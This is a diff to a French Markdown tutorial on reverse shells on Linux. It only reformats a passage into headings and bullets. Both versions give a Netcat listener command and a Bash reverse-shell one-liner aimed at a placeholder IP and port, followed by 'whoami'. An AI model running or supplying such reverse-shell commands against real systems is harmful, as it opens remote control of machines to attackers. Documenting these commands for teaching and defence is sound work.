@@ -27,12 +27,14 @@ Pour empêcher l'utilisation inverse du shell, vous pouvez imposer un contrôle 
 Pour envoyer des commandes à un shell inversé sur Linux, vous devez établir un listener sur votre machine locale, puis vous connecter au shell inverse sur la machine cible. 
 
 Voici un exemple de base en utilisant Netcat:
-- Établissez un Listener: Sur votre machine locale, démarrez un listener Netcat pour recevoir la connexion shell inversée : `nc -l -p 1337`
-Cette commande écoute les connexions entrantes sur le port 1337.
+## Établissez un Listener
+- Sur votre machine locale, démarrez un listener Netcat pour recevoir la connexion shell inversée : `nc -l -p 1337`
+  - Cette commande écoute les connexions entrantes sur le port 1337.
 
-Envoyer des commandes: Une fois le shell inversé connecté, vous pouvez envoyer des commandes comme vous le feriez dans une session shell normale. Pour un shell Bash inversé, vous pouvez utiliser : `bash -i >& /dev/tcp/your_ip/your_port 0>&1`
-
-Une fois que le shell inverse se connecte, vous pouvez envoyer des commandes directement au shell
+## Envoyer des commandes
+- Une fois le shell inversé connecté, vous pouvez envoyer des commandes comme vous le feriez dans une session shell normale
+- Pour un shell Bash inversé, vous pouvez utiliser : `bash -i >& /dev/tcp/your_ip/your_port 0>&1`
+  - Une fois que le shell inverse se connecte, vous pouvez envoyer des commandes directement au shell
 Par exemple, pour vérifier l'utilisateur actuel, vous pouvez taper : `whoami`
 
 # Autres reverse shell
